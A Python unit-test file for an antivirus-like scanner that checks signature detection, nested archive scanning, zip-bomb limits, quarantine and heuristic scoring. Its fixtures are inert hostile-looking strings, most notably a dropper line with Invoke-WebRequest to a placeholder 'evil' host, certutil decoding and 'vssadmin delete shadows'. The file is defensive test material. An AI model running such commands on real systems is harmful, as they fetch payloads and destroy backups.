import io
import tarfile
import tempfile
import unittest
import zipfile
from pathlib import Path

from aidefender import heuristics, quarantine, scanner
from aidefender.config import get_config
from aidefender.signatures import EICAR_STRING, builtin_db


def make_cfg(tmp: Path):
    cfg = get_config(tmp / "cfg")
    cfg.ensure_dirs()
    return cfg


class ScannerTest(unittest.TestCase):
    def test_eicar_signatures_present_in_db(self):
        # In-memory only: macOS endpoint protection intercepts EICAR files
        # written to disk (Operation not permitted on read), so never write
        # the live EICAR string to the filesystem in tests.
        db = builtin_db()
        self.assertIsNotNone(db.match_hash("275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f"))
        hits = db.match_strings(EICAR_STRING.lower())
        self.assertTrue(any("EICAR" in h for h in hits))

    def test_string_signature_detected_on_disk(self):
        with tempfile.TemporaryDirectory() as td:
            tmp = Path(td)
            target = tmp / "note.txt"
            target.write_text("this mentions mimikatz in a test context\n", encoding="utf-8")
            finding = scanner.scan_file(target, db=builtin_db(), cfg=make_cfg(tmp))
            self.assertEqual(finding.verdict, "malicious")
            self.assertTrue(any("Mimikatz" in r for r in finding.reasons))

    def test_clean_file(self):
        with tempfile.TemporaryDirectory() as td:
            tmp = Path(td)
            target = tmp / "hello.txt"
            target.write_text("hello world, this is a benign note.\n", encoding="utf-8")
            finding = scanner.scan_file(target, db=builtin_db(), cfg=make_cfg(tmp))
            self.assertEqual(finding.verdict, "clean")

    def test_double_extension_scores_suspicious(self):
        with tempfile.TemporaryDirectory() as td:
            tmp = Path(td)
            target = tmp / "invoice.pdf.exe"
            target.write_text("MZ fake binary with powershell -enc payload", encoding="utf-8")
            result = heuristics.analyze_file(target)
            self.assertGreaterEqual(result.score, 40)

    def test_quarantine_roundtrip(self):
        with tempfile.TemporaryDirectory() as td:
            tmp = Path(td)
            cfg = make_cfg(tmp)
            target = tmp / "bad.txt"
            target.write_text("quarantine me: mimikatz test token\n", encoding="utf-8")
            finding = scanner.scan_file(target, db=builtin_db(), cfg=cfg)
            record = quarantine.quarantine_file(target, finding.sha256, finding.verdict, finding.reasons, cfg)
            self.assertFalse(target.exists())
            self.assertEqual(len(quarantine.list_quarantine(cfg)), 1)
            restored = quarantine.restore_quarantine(record.id, tmp / "restored.txt", cfg)
            self.assertTrue(Path(restored).exists())
            self.assertEqual(len(quarantine.list_quarantine(cfg)), 0)

    def test_scan_missing_path_reports_error(self):
        with tempfile.TemporaryDirectory() as td:
            finding = scanner.scan_file(Path(td) / "nope.bin", db=builtin_db(), cfg=make_cfg(Path(td)))
            self.assertEqual(finding.verdict, "error")

    def test_zip_nested_string_signature(self):
        with tempfile.TemporaryDirectory() as td:
            tmp = Path(td)
            archive = tmp / "payload.zip"
            with zipfile.ZipFile(archive, "w") as zf:
                zf.writestr("inner/note.txt", "this mentions mimikatz in a nested archive\n")
            finding = scanner.scan_file(archive, db=builtin_db(), cfg=make_cfg(tmp))
            self.assertEqual(finding.verdict, "malicious")
            self.assertTrue(any("nested" in r and "Mimikatz" in r for r in finding.reasons))
            all_findings = scanner.scan_path(archive, db=builtin_db(), cfg=make_cfg(tmp))
            self.assertTrue(any(f.nested and f.verdict == "malicious" for f in all_findings))

    def test_nested_zip_and_tar(self):
        with tempfile.TemporaryDirectory() as td:
            tmp = Path(td)
            inner = io.BytesIO()
            with zipfile.ZipFile(inner, "w") as zf:
                zf.writestr("payload.txt", "nested mimikatz token\n")
            outer = tmp / "outer.zip"
            with zipfile.ZipFile(outer, "w") as zf:
                zf.writestr("inner.zip", inner.getvalue())
            finding = scanner.scan_file(outer, db=builtin_db(), cfg=make_cfg(tmp))
            self.assertEqual(finding.verdict, "malicious")

            tar_path = tmp / "payload.tar"
            with tarfile.open(tar_path, "w") as tf:
                data = b"tar member mentions mimikatz\n"
                info = tarfile.TarInfo(name="member.txt")
                info.size = len(data)
                tf.addfile(info, io.BytesIO(data))
            tar_finding = scanner.scan_file(tar_path, db=builtin_db(), cfg=make_cfg(tmp))
            self.assertEqual(tar_finding.verdict, "malicious")

    def test_zip_bomb_skipped_without_hang(self):
        with tempfile.TemporaryDirectory() as td:
            tmp = Path(td)
            cfg = make_cfg(tmp)
            cfg.archive_max_member_bytes = 4096
            cfg.archive_max_total_bytes = 8192
            archive = tmp / "bomb.zip"
            payload = b"\x00" * 200_000
            with zipfile.ZipFile(archive, "w", compression=zipfile.ZIP_DEFLATED) as zf:
                zf.writestr("huge.bin", payload)
            finding = scanner.scan_file(archive, db=builtin_db(), cfg=cfg)
            self.assertTrue(any("archive skipped" in r for r in finding.reasons))
            self.assertNotEqual(finding.verdict, "error")

    def test_extra_dropper_tokens_surface_in_heuristics(self):
        with tempfile.TemporaryDirectory() as td:
            tmp = Path(td)
            target = tmp / "dropper.ps1"
            target.write_text(
                "Invoke-WebRequest http://evil /; certutil -decode a b; vssadmin delete shadows\n",
                encoding="utf-8",
            )
            result = heuristics.analyze_file(target)
            self.assertGreaterEqual(result.score, 10)
            self.assertTrue(result.features.get("tokens"))
            self.assertTrue(any("suspicious keywords" in r for r in result.reasons))


if __name__ == "__main__":
    unittest.main()
